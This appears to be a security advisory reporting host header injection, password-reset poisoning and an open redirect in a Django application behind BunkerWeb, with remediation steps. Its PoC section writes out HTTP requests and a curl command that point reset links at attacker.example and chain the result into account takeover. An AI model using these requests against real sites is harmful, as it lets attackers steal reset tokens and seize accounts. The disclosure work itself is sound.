# Description

Host header injection and password-reset poisoning (CWE-116), with a separate open redirect issue (CWE-601) in the advertisement click endpoint.

Django is configured with `ALLOWED_HOSTS = ['*']` (`settings/production.py:29`) and `USE_X_FORWARDED_HOST = True` (`settings/base.py:35`), resulting in insufficient validation of the application host. Django's `request.get_host()` relies on the configured host validation policy.

The `_build_email_link()` helper (`Account/views.py:42-51`) uses `SITE_URL` when configured and otherwise falls back to `request.build_absolute_uri()`. The default value of `SITE_URL` is empty (`settings/base.py:41`).

This configuration compromises the integrity of account recovery links. Password-reset poisoning and subsequent account takeover have been demonstrated on test accounts, both through direct Django access and through BunkerWeb.

BunkerWeb's default server also reflects supplied host values in redirect responses. This behavior does not constitute a standalone open redirect.

The advertisement click endpoint independently redirects to the advertisement's stored `target_url` without destination-domain allow-list validation or enforcement of the advertisement approval status. Its impact depends on the advertisement being displayed to users.

# Exploitation

| Vector | Action | Result |
|--------|--------|--------|
| Host header reflection | `GET /account/login` with `Host: evil.com`. | `301 → https://evil.com/account/login`, unauthenticated. Response generated by BunkerWeb's default server for unknown hosts; host reflection, not a standalone open redirect. |
| Ad click | Create an ad with `target_url=https://evil.com`, hit `/advertisement/click/<uuid>/`. | `302 → https://evil.com`. Redirect occurs before advertisement approval. The endpoint is POST-only and CSRF-protected. Impact depends on the advertisement being displayed. |
| Password-reset poisoning | Account recovery link validation through direct Django access and BunkerWeb. | Password-reset poisoning and account takeover demonstrated on test accounts. |

# PoC

**1. Host header reflection in BunkerWeb's default-server responses:**

```http
GET /account/password-reset-request HTTP/1.1
Host: evil.com
→ HTTP/1.1 301 Moved Permanently
  Location: https://evil.com/account/password-reset-request
```

```http
GET / HTTP/1.1
Host: evil.com
→ HTTP/1.1 301  Location: https://evil.com/
```
These responses originate from BunkerWeb's default server for unknown hosts. They demonstrate host reflection rather than a standalone open redirect. The configured application virtual host does not perform the same HTTP-to-HTTPS redirection.
Additional HTTPS testing returned an HTTP 302 response from the default server, with a reflected host and a `/setup` destination.

**2. Advertisement click redirect (works pre-approval):**

```http
POST /advertisement/create/  → target_url=https://evil.com/phishing-page  (status: Pending Review)
POST /advertisement/click/a5d36db2-…/  →  HTTP 302 Location: https://evil.com/phishing-page
```
The advertisement click endpoint is POST-only and protected by Django's CSRF middleware. A GET request returns HTTP 405.

The redirect is accepted before advertisement approval, but its impact on other users depends on the advertisement being displayed.

**3. Password-reset poisoning confirmation:**

Runtime testing on dedicated test accounts confirmed that account recovery links could reference an unauthorized external origin.

Direct Django access (`Host` or `X-Forwarded-Host`, both honoured):

```http
POST /account/password-reset-request/ HTTP/1.1
Host: attacker.example                  (or: X-Forwarded-Host: attacker.example)
Cookie: csrftoken=<T>
Content-Type: application/x-www-form-urlencoded

csrfmiddlewaretoken=<T>&email=<victim>@tbox.traced
→ 200 "If an account with that email exists, a reset link has been sent."
```

Through BunkerWeb, an absolute request line selects the real virtual host while the `Host` header is forwarded unchanged as `X-Forwarded-Host` (`proxy_set_header X-Forwarded-Host $http_host`):

```bash
curl --request-target "http://domain.com/account/password-reset-request/" -H "Host: attacker.example" \
  -H "Cookie: csrftoken=<T>" --data "csrfmiddlewaretoken=<T>&email=<victim>@tbox.traced" http://<BUNKERWEB_IP>/
# 200 "If an account with that email exists, a reset link has been sent."
```

In both cases the e-mail received by the victim contains:

```
Click the link to reset your password: http://attacker.example/account/password_reset/?token=<valid_token>
```

When the victim clicks the link, the token is sent to the attacker's host. The attacker then submits it to the real application (`POST /account/password_reset/` with `token`, `password1`, `password2` → `302 /account/login/`) and logs in with the new password.

The same poisoning applies to account-activation e-mails (`POST /account/register/` with `X-Forwarded-Host: attacker.example` → `http://attacker.example/account/activate/?username=...&token=...`).

Account takeover was demonstrated both through direct Django access and through BunkerWeb over HTTP and HTTPS.

The reverse-proxy configuration does not consistently enforce the canonical application origin.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Unauthorized access to account data following account takeover through password-reset poisoning. |
| Integrity | Compromise of the account recovery process, unauthorized password changes, and redirection to untrusted external websites through the advertisement click feature. |
| Availability | None directly. |

Overall severity: **High** — demonstrated unauthenticated password-reset poisoning leading to account takeover, combined with an independent advertisement redirect vulnerability.

# Remediation

1. **Pin the canonical host in BunkerWeb**: restrict `SERVER_NAME`, disable the default server using `DISABLE_DEFAULT_SERVER`, and reject requests whose request-line host differs from the Host header.
2. **Secure forwarded host handling**: remove `X-Forwarded-Host` unless required. If required, forward the validated host using `$host` rather than an unvalidated client-supplied value.
3. **Restrict Django host validation**: configure `ALLOWED_HOSTS` with the actual authorized domains and disable `USE_X_FORWARDED_HOST` unless required by a securely configured reverse proxy.
4. **Configure a canonical `SITE_URL`** in production and ensure that security-sensitive email links do not depend on untrusted request-derived host information. Apply this policy consistently to password-reset, account-activation and email-change links.
5. **Validate advertisement destinations** against an allow-list, only redirect for approved advertisements, and add an interstitial warning before external redirects.
